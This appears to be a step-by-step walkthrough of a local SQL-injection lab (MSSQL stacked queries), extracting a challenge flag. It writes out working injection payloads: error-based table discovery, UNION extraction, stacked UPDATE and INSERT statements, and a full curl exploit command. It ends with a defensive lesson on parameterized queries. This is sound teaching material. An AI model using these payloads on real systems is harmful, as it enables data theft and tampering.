<h4>Step 1: Test Normal Note Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1<br>
        <span class="prompt">SQL: </span>SELECT title, content FROM notes WHERE id = '1'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Title:</strong> Meeting Notes<br>
        <strong>Content:</strong> Discuss Q3 roadmap with engineering team<br><br>
        <span class="prompt"># Verified via curl -- result-data box displays title/content correctly</span>
    </div>
</div>

<h4>Step 2: Confirm Injection and Stacked Queries</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Stacked Query Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: [Microsoft][ODBC Driver 18 for SQL Server][SQL Server]Unclosed quotation mark after the character string ''.</strong><br><br>
        <span class="prompt">Input: </span>1'; SELECT 1 -- -<br>
        <span class="prompt">Result: </span><strong>Title:</strong> Meeting Notes | <strong>Content:</strong> Discuss Q3 roadmap -- stacked query executed without error!
    </div>
</div>

<h4>Step 3: Discover the Flags Table</h4>
<p>Use error-based CONVERT to find hidden tables.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME != 'notes')) -- -<br>
        <span class="prompt">Error: </span>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the nvarchar value '<strong>flags</strong>' to data type int.
    </div>
</div>

<h4>Step 4: Extract via UNION (Direct)</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. UNION Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT 'LEAKED', flag FROM flags -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Title:</strong> LEAKED<br>
        <strong>Content:</strong> <strong>FLAG{ms_st4ck3d_full_ctrl}</strong><br><br>
        <span class="prompt"># Verified -- UNION bypasses original WHERE id='' returning no rows, injects flag directly</span>
    </div>
</div>

<h4>Step 5: Extract via Stacked UPDATE</h4>
<p>The stacked query approach: modify an existing note with the flag value.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Stacked UPDATE</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1'; UPDATE notes SET content=(SELECT TOP 1 flag FROM flags) WHERE id=2; -- -<br>
        <span class="prompt">Response: </span><strong>Title:</strong> Meeting Notes | <strong>Content:</strong> FLAG{ms_st4ck3d_full_ctrl} (note 1 shown, note 2 silently updated)<br><br>
        <span class="prompt">// Now view note 2:</span><br>
        <span class="prompt">Input: </span>2<br>
        <span class="prompt">Output:</span><br>
        <strong>Title:</strong> Todo List<br>
        <strong>Content:</strong> <strong>FLAG{ms_st4ck3d_full_ctrl}</strong><br><br>
        <span class="prompt"># Verified -- stacked UPDATE successfully overwrote note 2 content with the flag</span>
    </div>
</div>

<h4>Step 6: Alternative. Stacked INSERT</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Stacked INSERT</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1'; INSERT INTO notes (title, content) VALUES ('pwned', (SELECT TOP 1 flag FROM flags)); -- -<br>
        <span class="prompt"># </span>Then view the latest note ID to read the flag
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_st4ck3d_full_ctrl}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab6" \<br> --data-urlencode "id=' UNION SELECT 'LEAKED', flag FROM flags -- -"<br><br>
        <span class="prompt"># Verified output:</span><br>
        <strong>Title:</strong> LEAKED | <strong>Content:</strong> FLAG{ms_st4ck3d_full_ctrl}
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MSSQL's native support for stacked queries makes SQL injection
    far more dangerous than on MySQL (where stacked queries are typically disabled). An attacker
    can execute <code>UPDATE</code>, <code>INSERT</code>, <code>DELETE</code>, <code>EXEC</code>,
    and even <code>xp_cmdshell</code> after a simple <code>;</code>. This turns a read-only
    injection into full database (and potentially OS) control. Always use parameterized queries
    and apply the principle of least privilege to database accounts.
</div>
